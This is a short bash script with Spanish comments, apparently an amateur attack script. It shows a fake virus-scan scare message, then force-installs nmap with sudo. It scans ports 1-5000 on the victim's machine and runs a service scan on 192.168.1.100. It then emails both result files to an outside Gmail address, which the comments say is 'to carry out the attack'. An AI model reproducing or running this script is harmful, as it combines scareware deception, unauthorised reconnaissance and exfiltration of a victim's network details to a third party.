echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"
sudo apt install nmap #le obligamos a instalar nmap para descubrir que puertos tiene vulnerable
nmap -p 1-5000 127.0.0.1 -oN resultado_nmap.txt #le escaneamos los puertos del 1 al 5000
#le añadimos el archivo de texto donde mandara los resultados
nmap -sV -p$(cat resultado_nmap.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',') 192.168.1.100 -oN servicios_detectados.txt
#le añadimos que nos muestre los servicios que tiene abiertos en los puertos que hemos encontrado
mail -s "Resultados Nmap" richardo94ac@gmail.com < resultado_nmap.txt
#le añadimos que nos mande por correo los resultados para poder realizar el ataque. 
mail -s "Resultados del Escaneo Nmap" richardo94ac@egmail.com < servicios_detectados.txt
#le añadimos que nos mande por correo los servicios que tiene abiertos en los puertos que hemos encontrado
cat servicios_detectados.txt
cat resultado_nmap.txt | grep "open"
#vemos dentro del archivo que nos hemos mandado que puertos tiene abiertos